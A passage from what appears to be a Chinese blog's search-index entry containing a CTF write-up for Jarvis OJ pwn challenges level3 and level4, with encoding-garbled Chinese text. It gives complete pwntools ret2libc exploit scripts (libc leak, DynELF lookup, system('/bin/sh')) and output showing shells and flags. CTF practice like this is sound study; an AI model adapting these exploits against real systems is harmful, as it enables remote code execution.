<code>system(&#39;/bin/sh&#39;)</code>å¹¶æ‰§è¡Œã€‚</p><p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9879</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">write_plt = hex(elf.plt[<span class="string">'write'</span>])</span><br><span class="line">read_got = hex(elf.got[<span class="string">'read'</span>])</span><br><span class="line">vuln_addr = hex(elf.symbols[<span class="string">'vulnerable_function'</span>])</span><br><span class="line">args = p32(<span class="number">0x01</span>) + p32(int(read_got, <span class="number">16</span>)) + p32(<span class="number">0x04</span>)</span><br><span class="line"></span><br><span class="line">payload_leak = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) </span><br><span class="line">payload_leak += p32(int(write_plt, base = <span class="number">16</span>)) </span><br><span class="line">payload_leak += p32(int(vuln_addr, base = <span class="number">16</span>)) </span><br><span class="line">payload_leak += args</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(payload_leak)</span><br><span class="line"></span><br><span class="line">re = sh.recv()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"><span class="keyword">print</span> re</span><br><span class="line">read_addr = u32(re)</span><br><span class="line">read_libc = <span class="number">0x000dd3e0</span></span><br><span class="line">offset =  read_addr - read_libc</span><br><span class="line">system_libc = <span class="number">0x00040310</span></span><br><span class="line">exit_libc = <span class="number">0x00033260</span></span><br><span class="line">system_addr = offset + system_libc</span><br><span class="line">exit_addr = offset + exit_libc</span><br><span class="line">binsh_addr = offset + <span class="number">0x162d4c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'payload :'</span> + payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>æ‰§è¡Œæ•ˆæœ:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9879: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level3/level3'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">ï¿½ckï¿½</span><br><span class="line">payload :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\x93aï¿½`ï¿½`ï¿½Lï¿½sï¿½</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;d85346df5770f56f69025bc3f5f1d3d0&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><blockquote><p>åŒæ ·ä¸ä¼šå†™expâ€¦</p></blockquote><p>æ€è·¯ä¸level3å¤§è‡´ç›¸åŒï¼Œä¸è¿‡è¿™æ¬¡æ²¡æœ‰ç»™å‡ºlibcï¼Œç™¾åº¦äº†wpæ‰çŸ¥é“éœ€è¦ç”¨åˆ°DynELFæ¨¡å—æš´åŠ›è·‘å‡ºsystemçš„åœ°å€<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="string">'9880'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x0804844b</span></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¾—åˆ°systemåœ°å€åéœ€è¦å‘å¯æ‰§è¡Œæ®µå†™å…¥/bin/shï¼Œå› ä¸ºå¼€å¯äº†NXä¿æŠ¤ï¼Œè¿™é‡Œé€‰æ‹©å‘bssæ®µå†™å…¥</span></span><br><span class="line">bss_addr = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="comment">#ä¸æ–­è¿”å›åˆ°vulnï¼Œæ¯æ¬¡æº¢å‡ºéƒ½è°ƒç”¨writeï¼Œä¼ªé€ å‚æ•°ï¼Œæ‰“å°åœ°å€ï¼Œåˆ©ç”¨DynELFå¾—åˆ°systemç»å¯¹åœ°å€</span></span><br><span class="line">    payload_leak = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(vuln_addr) + p32(<span class="number">0x1</span>) + p32(addr) + p32(<span class="number">0x4</span>)</span><br><span class="line">    sh.sendline(payload_leak)</span><br><span class="line">    leak = sh.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line">dyn = DynELF(leak, elf = ELF(<span class="string">"./level4"</span>))</span><br><span class="line">system_addr = dyn.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¼ªé€ readå‚æ•°ï¼Œæº¢å‡ºè¿”å›åˆ°readï¼Œå¹¶å‘ç›®æ ‡åœ°å€ï¼ˆbssæ®µï¼‰å†™å…¥/bin/sh</span></span><br><span class="line">payload_write = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(read_plt) + p32(vuln_addr) + p32(<span class="number">0x0</span>) + p32(bss_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line">sh.sendline(payload_write)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>) <span class="comment">#è¿™æ­¥ç»“æŸåï¼Œå†æ¬¡è¿”å›åˆ°vuln</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è°ƒç”¨systemå‡½æ•°</span></span><br><span class="line">useless_addr = <span class="number">0x11111111</span></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(useless_addr) + p32(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>æ‰§è¡Œæ•ˆæœï¼š<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9880: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level4'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Loading from <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level4'</span>: 0xf77de930</span><br><span class="line">[+] Resolving <span class="string">'system'</span> <span class="keyword">in</span> <span class="string">'libc.so'</span>: 0xf77de930</span><br><span class="line">[!] No ELF provided.  Leaking is much faster <span class="keyword">if</span> you have a copy of the ELF being leaked.</span><br><span class="line">[*] Trying lookup based on Build ID: de799a85b2ebc2929eb4585f009d0c5e6211f2f8</span><br><span class="line">[*] Skipping unavialable libc de799a85b2ebc2929eb4585f009d0c5e6211f2f8</span><br><span class="line">[*] .gnu.hash/.<span class="built_in">hash</span>, .strtab and .symtab offsets</span><br><span class="line">[*] Found DT_GNU_HASH at 0xf77afdd8</span><br><span class="line">[*] Found DT_STRTAB at 0xf77afde0</span><br><span class="line">[*] Found DT_SYMTAB at 0xf77afde8</span><br><span class="line">[*] .gnu.hash parms</span><br><span class="line">[*] <span class="built_in">hash</span> chain index</span><br><span class="line">[*] <span class="built_in">hash</span> chain</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;882130cf51d65fb705440b218e94e98e&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> ç©å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
